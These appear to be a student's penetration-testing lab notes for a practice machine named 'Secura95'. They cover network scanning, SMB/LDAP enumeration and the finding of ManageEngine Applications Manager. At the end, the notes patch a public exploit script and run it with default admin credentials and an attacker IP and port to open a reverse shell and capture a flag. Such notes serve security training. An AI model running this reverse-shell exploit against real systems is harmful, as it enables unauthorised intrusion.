
- Poked SMB -  no avail. 
- Poked RPC - no avail. 


1. First step: One of the first things we can do is run a subnet host discovery scan. 
   fping -agq 10.211.11.0/24

2. ldapsearch -x -H ldap://192.168.208.97 -s base (worked!)
---
Skills used:

Enumeration
Vulernability assessment
Fixing exploits


-----
lowering MTU:

```powershell
sudo ip l s dev tun0 mtu 1250
```


```powershell
#1. Start with Host Discovery
fping -agq 192.168.213.0/24 
192.168.237.95
192.168.237.96
192.168.237.97
192.168.237.254

#2. Map the hosts
nano /etc/hosts 

```


----
# Secura95

Initial Scan
```powershell
nmap 192.168.237.95 -oN initial_scan.log 
```

![[Pasted image 20251130083627.png]]


**Services**:

1. RPC 135
2. SMB 139,445
3. RDP 3389
4. WinRM 5985 
5. WebService 8443 (https-alt)
6. Unknown: 5001, 12000

Since the RDP and WinRM requires user creds, the only two things that we can start exploring is RPC/SMB (enum4linux-ng) and WebService hosted on 8443.
Let's do a full scan + enum4linux-ng + exploring 8443. 

```powershell
# Checks: LDAP, LDAPS, SMB, SMB over NetBIOS, SMB Guest session, SMB NULL Session, RPC
enum4linux-ng -A 192.168.237.95 | tee e4lng.log


```

We have a HTTP alternative port open:

```
8443/tcp open  https-alt     syn-ack ttl 125
```


![[Pasted image 20251129083309.png]]


Access via HTTPS: https://192.168.213.95:8443/

Applications Manager (Build No:14710)

![[Pasted image 20251129083719.png]]



Potential Vulnerability:


![[Pasted image 20251129083920.png]]

Exploit wast running. 
![[Pasted image 20251129084716.png]]


Installed Java

![[Pasted image 20251129084821.png]]


```powershell
# Fix the exploit
sed -i 's/release 7/release 8/g' 48793.py
```


```powershell
# run the exploit
# The application manager is hosted on two ports 8443 (HTTPS) and port 44444 (HTTP).
# port 8443 isn't vulnerable, but 44444 allows gettting a rev shell

python3 48793.py http://192.168.237.95:44444 admin admin 192.168.45.206 443
```

![[Pasted image 20251130110330.png]]


Caputred the first flag-proof:


![[Pasted image 20251130110832.png]]

